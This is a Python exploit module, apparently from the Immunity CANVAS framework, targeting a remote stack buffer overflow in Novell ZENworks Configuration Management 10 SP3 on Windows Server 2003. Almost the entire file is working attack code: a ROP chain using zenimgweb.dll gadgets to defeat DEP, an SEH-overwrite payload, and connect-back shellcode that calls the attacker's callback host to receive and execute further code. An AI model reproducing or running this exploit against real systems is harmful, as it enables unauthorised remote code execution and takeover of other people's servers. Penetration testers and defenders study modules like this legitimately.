#! /usr/bin/env python

"""
Novell ZENworks Configuration Management 0x21 Buffer Overflow
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine
from exploitutils import *
from tcpexploit import *
import socket

NAME                           = "Novell ZENworks Configuration Management 0x21 Buffer Overflow"
DESCRIPTION                    = "Novell ZENworks Configuration Management 0x21 Buffer Overflow"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Novell"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION["OSVDB"]         = "http://osvdb.org/show/osvdb/65361" 
DOCUMENTATION['CVSS']          = 10

VERSION                        = "1.0"
                                                                                
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Windows"]]
PROPERTY['VERSION']            = ['2003']
                                                                                
CHANGELOG                      = """
                                                                                
"""

DOCUMENTATION['Notes']         = """
Tested on ZenWork Configuration Managment 10 SP3 on Windows Server 2003 SP1
This exploit should work and all suported Windows version, the only
change needed is to change the offset of VirtualFree from VirtualAlloc according
to the Windows version.
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(998)
        self.setHost("")
        self.name=NAME
        self.badstring = ""

    def getargs(self):
        self.port = self.argsDict.get("port", self.port)
        
    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
        
    def createShellcode(self):        
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback.port, 
                                      'ipaddress' : self.callback.ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = True
        self.shellcode = sc.get()

        self.log("Shellcode size: %d" % len(self.shellcode))
                    
    def run(self):
        
        self.getargs()
        self.host = self.target.interface
        
        # This is the offset for Windows Server 2003 SP1
        vfree_address    = 0x77E68CFC
        vprotect_address = 0x77E41B88
        offset = vprotect_address - vfree_address  
        
        # Rop made from zenimgweb.dll        
        rop = intel_order(0x10011137)   # pop eax
        rop += intel_order(0x00000040)   # NewProtect
        rop += intel_order(0x10032191)   # xchg eax,edx ; pop edi ; pop esi ; pop ebp ; pop ebx
        rop += intel_order(0x90909090)*4 # junk for the pops
        
        rop += intel_order(0x1001017E)    # pop ebx
        rop += intel_order(0x00000400)   # size 
        
        rop += intel_order(0x10013159)   # pop ebp;
        rop += intel_order(0x10030D5B)   # pointer to jmp esp
        
        rop += intel_order(0x10011137)   # pop eax
        rop += intel_order(0x1007D154)   # pointer to VirtualFree Address
        rop += intel_order(0x10011B04)   # mov eax,[eax]
        rop += intel_order(0x10012C87)   # pop ecx
        rop += intel_order(offset)       # offset from VirtualFree to VirtualProtect
        rop += intel_order(0x1001E5A6)   # add eax,ecx
        rop += intel_order(0x10016818)   # push eax ; pop esi
        
        rop += intel_order(0x10011137)   # pop eax
        rop += intel_order(0x90909090)
        
        rop += intel_order(0x10012C87)   # pop ecx
        rop += intel_order(0x1009C010)   # writable address	
        
        rop += intel_order(0x1001480E)   # pop edi;
        rop += intel_order(0x10010125)   # pointer to ret
        
        rop += intel_order(0x10018B49)   # pushad
        
        buf1 = 'A'*216                   # This is the offset for the add of
        buf1 += rop                      # the SEH Handler
        buf1 += self.shellcode
        buf1 += 'A' * (8252 - len(buf1))
        buf1 += 'B'*4                    # Pointer to next SEH record
        buf1 += intel_order(0x10024a7c)  # SEH Handler ADD ESP,4B4 (1204)
        buf1 += 'A' * (8288 - len(buf1))        
        
        buffer =  big_order(0x21)        # Big endian opcode
        buffer += big_order(len(buf1))   # Big endian length of the arg
        buffer += buf1

        s = self.gettcpsock()
        
        try:
            s.connect((self.host,self.port))
            s.send(buffer)
        except Exception, ex:
            self.log('Error: %s' % ex)
        finally:
            s.close()

        for _ in xrange(0, 10):
            if self.ISucceeded(): return 1
            time.sleep(1)

        return 0

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)




